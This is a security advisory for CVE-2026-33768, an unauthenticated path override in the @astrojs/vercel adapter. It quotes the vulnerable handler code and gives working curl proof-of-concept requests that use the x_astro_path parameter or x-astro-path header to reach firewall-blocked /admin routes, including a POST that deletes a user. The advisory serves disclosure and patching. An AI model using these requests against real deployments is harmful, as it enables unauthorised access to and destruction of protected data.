# [M] Astro: Unauthenticated Path Override via `x-astro-path` / `x_astro_path`

## Summary
Severity: Medium
Advisory: GHSA-mr6q-rp88-fx84
CVE: CVE-2026-33768
CWE: CWE-441, CWE-862
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N (CVSS_V3)
Published: 2026-03-26
Source: https://github.com/advisories/GHSA-mr6q-rp88-fx84
Type: github-advisory

## Affected
- npm: `@astrojs/vercel` — affected >=0 <10.0.2

## Details
## Summary

The `@astrojs/vercel` serverless entrypoint reads the `x-astro-path` header and `x_astro_path` query parameter to rewrite the internal request path, with no authentication whatsoever. On deployments without Edge Middleware, this lets anyone bypass Vercel's platform-level path restrictions entirely.

The override preserves the original HTTP method and body, so this isn't limited to GET. POST, PUT, DELETE all land on the rewritten path. A Firewall rule blocking `/admin/*` does nothing when the request comes in as `POST /api/health?x_astro_path=/admin/delete-user`.

## Affected Versions

Verified against:
- **Astro 5.18.1 + @astrojs/vercel 9.0.4** — GET and POST override both work. Full exploitation.
- **Astro 6.0.3 + @astrojs/vercel 10.0.0** — GET override works. POST/DELETE hit a `duplex` bug in the Request constructor (the `duplex: 'half'` option is required when passing a ReadableStream body — this has been an issue since Node.js 18 but is consistently enforced in the Node.js 22+ runtime that Astro 6 requires). This is not a security fix — the code explicitly passes `body: request.body` and intends to preserve it. Once the missing `duplex` option is added, all methods will be exploitable on v6 as well.

The vulnerable code path is identical across both versions.

## Affected Component

- **Package**: `@astrojs/vercel`
- **File**: `packages/integrations/vercel/src/serverless/entrypoint.ts` (lines 19–28)
- **Constants**: `packages/integrations/vercel/src/index.ts` (lines 44–45)

## Vulnerable Code

The handler blindly trusts the caller-supplied path:

```typescript
const realPath =
    request.headers.get(ASTRO_PATH_HEADER) ??
    url.searchParams.get(ASTRO_PATH_PARAM);
if (typeof realPath === 'string') {
    url.pathname = realPath;  // no validation, no auth
    request = new Request(url.toString(), {
        method: request.method,   // preserved
        headers: request.headers, // preserved
        body: request.body,       // preserved
    });
}
```

What makes this worse is the inconsistency. `x-astro-locals` right below it is gated behind `middlewareSecret`, but `x-astro-path` gets nothing:

```typescript
// x-astro-locals: protected
if (astroLocalsHeader) {
    if (middlewareSecretHeader !== middlewareSecret) {
        return new Response('Forbidden', { status: 403 });
    }
    locals = JSON.parse(astroLocalsHeader);
}
// x-astro-path: no equivalent check (lines 19-28 above)
```

## Conditions

1. Astro + `@astrojs/vercel` adapter
2. `output: 'server'` (SSR)
3. No `src/middleware.ts` defined, or middleware not using Edge mode

This is a realistic production configuration. Middleware is optional and many deployments skip it.

The `x-astro-path` mechanism exists for a legitimate purpose: when Edge Middleware is present, it forwards requests to a single serverless function (`_render`) and uses this header to communicate the original path. The Edge Middleware always overwrites any client-supplied value with the correct one. But when no Edge Middleware is configured, requests hit the serverless function directly, and the override is exposed to external callers with no protection.

## Proof of Concept

Setup: minimal Astro SSR project on Vercel, no middleware. Routes: `/public` (page), `/api/health` (API endpoint), `/admin/secret` (page), `/admin/delete-user` (API endpoint). Vercel Firewall blocks `/admin/*`.

**GET — page content override:**
```bash
curl "https://target.vercel.app/public?x_astro_path=/admin/secret"
# Returns: PAGE_ID: admin-secret
```

**GET — API route override:**
```bash
curl "https://target.vercel.app/api/health?x_astro_path=/admin/delete-user"
# Returns: {"pageId":"admin-delete-user","message":"This is a protected admin API endpoint","method":"GET"}
```

**Header override:**
```bash
curl -H "x-astro-path: /admin/secret" https://target.vercel.app/public
# Returns: PAGE_ID: admin-secret
```

**Vercel Firewall bypass (GET):**
```bash
# Direct access — blocked
curl https://target.vercel.app/admin/secret
# Returns: Forbidden

# Via override — Firewall sees /public, serves /admin/secret
curl "https://target.vercel.app/public?x_astro_path=/admin/secret"
# Returns: PAGE_ID: admin-secret
```

**Vercel Firewall bypass (POST) — verified on Astro 5.x:**
```bash
# Direct access — blocked
curl -X POST -H "Content-Type: application/json" -d '{"userId":"123"}' \
  https://target.vercel.app/admin/delete-user
# Returns: Forbidden

# Via override — Firewall sees /api/health, executes POST /admin/delete-user
curl -X POST -H "Content-Type: application/json" -d '{"userId":"123"}' \
  "https://target.vercel.app/api/health?x_astro_path=/admin/delete-user"
# Returns: {"action":"delete-user","status":"deleted","method":"POST"}
```

The Firewall evaluates the original path. The serverless function serves the overridden path. Method and body carry over.

ISR is not affected. Vercel's cache layer appears to intercept before the function runs.

## Impact

**Firewall/WAF bypass — read (Critical):** Any path-based restriction in Vercel Dashboard or `vercel.json` (IP blocks, geo restrictions, rate limits scoped to specific paths) can be bypassed for GET requests. Protected page content and API responses are fully readable.

**Firewall/WAF bypass — write (Critical):** POST/PUT/DELETE requests also bypass Firewall rules. The method and body are preserved through the override, so any write endpoint behind path-based restrictions is reachable. Verified on Astro 5.x; on 6.x this is blocked by an unrelated `duplex` bug in the Request constructor, not by any security check.

**Audit log mismatch (Medium):** Vercel logs record the original request path and query string (e.g. `/public?x_astro_path=/admin/secret`), so the override parameter is technically visible. However, the logged path (`/public`) does not reflect the path actually served (`/admin/secret`). Detecting this attack from logs requires knowing what `x_astro_path` means — standard monitoring and alerting based on request paths will not catch it.

## Prior Art

CVE-2025-29927 (Next.js): `x-middleware-subrequest` header injectable by external clients, bypassing middleware. Same class of vulnerability.

## References
- https://github.com/withastro/astro/security/advisories/GHSA-mr6q-rp88-fx84
- https://nvd.nist.gov/vuln/detail/CVE-2026-33768
- https://github.com/withastro/astro/pull/15959
- https://github.com/withastro/astro/commit/335a204161f5a7293c128db570901d4f8639c6ed
- https://github.com/advisories/GHSA-f82v-jwr5-mffw
- https://github.com/withastro/astro
- https://github.com/withastro/astro/releases/tag/@astrojs/vercel@10.0.2
